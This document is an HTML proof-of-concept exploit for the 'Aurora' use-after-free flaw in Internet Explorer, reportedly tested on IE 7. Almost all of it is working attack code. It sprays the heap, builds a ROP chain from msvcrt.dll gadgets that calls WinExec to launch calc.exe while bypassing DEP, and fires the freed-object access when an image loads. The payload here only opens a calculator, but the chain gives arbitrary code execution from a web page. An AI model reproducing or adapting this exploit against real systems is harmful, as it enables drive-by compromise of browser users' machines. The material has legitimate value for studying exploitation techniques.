<html>

<!-- PoC exploit for Aurora IE use after free

This version is a DEP bypass tested under IE 7.
Uses a call to WinExec() to execute calc.exe.
Uses reliable javascript heap spray to trigger object pointer overwrite
and parse control to ROP code.

Created by mr_me <steventhomasseeley@gmail.com>

special securabit release 
-->

<script>
// Create ~ 200 comments using the randomly selected three character string AAA, will change data later in an attempt to overwrite
var Array1 = new Array();
for (i = 0; i < 200; i++)
{
  Array1[i] = document.createElement("COMMENT");
  Array1[i].data = "AAA";
}

var Element1 = null;

function HeapSpray()
{
  Array2 = new Array();
  var junk = unescape( '%ucccc%ucccc');
  // This is our pivot point
  var StartSprayValue = unescape('\u01b4\u2006');
  
  // rop stage 0 shellcode
  // calls WinExec() to bypass DEP
  // all instructions are taken from msvcrt.dll for stability
var SprayValue = unescape('\ufa1c\u77c4');	// 2 -> 0x77c4fa1c # pop ebx; retn
  SprayValue += unescape('\uffff\uffff');	// 3 -> 0xffffffff
  SprayValue += unescape('\u27e1\u77c1');	// 4 -> 0x77c127e1 # inc ebx; retn	
  SprayValue += unescape('\ubb36\u77c1');	// 5 -> 0x77c1bb36 # pop ebp; retn
  SprayValue += unescape('\uffff\uffff');	// 3 -> 0xffffffff
  SprayValue += unescape('\u1891\u77c2');	// 4 -> 0x77c21891 # pop esi; retn
  SprayValue += unescape('\u250d\u7c86');	// 5 -> 0x7c86250d # WinExec() 
  SprayValue += unescape('\u3b47\u77c2');	// 6 -> 0x77c23b47 # pop edi; retn
  SprayValue += unescape('\u3b48\u77c2');	// 7 -> 0x77c23b48 # retn (rop nop)
  SprayValue += unescape('\u2df9\u77c1');	// 8 -> 0x77c12df9 # pushad; retn
  SprayValue += unescape('\u6163\u636c');	// calc
  SprayValue += unescape('\u0000\u0000');	// NULL to clean up the call
  SprayValue += unescape('\ufa1a\u77c4'); 	// 1 -> 0x77c4fa1a # mov esp,ebx; pop ebx
  SprayValue += unescape('\u4e4e\u4e4e');	// left over
  SprayValue += unescape('\u4f4f\u4f4f');	// left over
  SprayValue += unescape('\u5050\u5050');	// left over
  SprayValue += unescape('\u5151\u5151');	// left over
  SprayValue += unescape('\u5252\u5252');	// left over
  SprayValue += unescape('\u5353\u5353');	// left over
  SprayValue += unescape('\u5454\u5454'); 	// left over

  do { StartSprayValue += SprayValue; } while( StartSprayValue.length < 200 ); //870400
  var heapblock = StartSprayValue;
  while(heapblock.length < 0x40000) heapblock += heapblock
  finalspray = heapblock.substring(2, 0x40000-0x21)
  for (j = 0; j < 1500; j++) Array2[j] = finalspray + junk;
}

// Function is called by the onload event of the IMG tag below
// Creates and deletes object, calls the function to overwrite memory
function FRemove(Value1)
{ 
HeapSpray();
  Element1 = document.createEventObject(Value1); // Create the object of the IMG tag
  document.getElementById("SpanID").innerHTML = ""; // Set parent object to null to trigger heap free()
  window.setInterval(FOverwrite, 50); // Call the overwrite function every 50 ms
}

// Function attempts to overwrite heap memory of deleted object and then access object to trigger crash
function FOverwrite()
{
// overwrite the object's heap memory with a pointer to our ROP heap spray
buffer = "\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006\u01b4\u2006";

  for (i = 0; i < Array1.length; i++)
  {
    Array1[i].data = buffer; // Set comment data to buffer, try to overwrite heap memory of deleted object
  }
  var a = Element1.srcElement; // Access the pointer to the deleted object, trigger crash
}

</script>
<body>
<span id="SpanID"><IMG src="/abc.gif" onload="FRemove(event)" /></span>
</body>
</html>
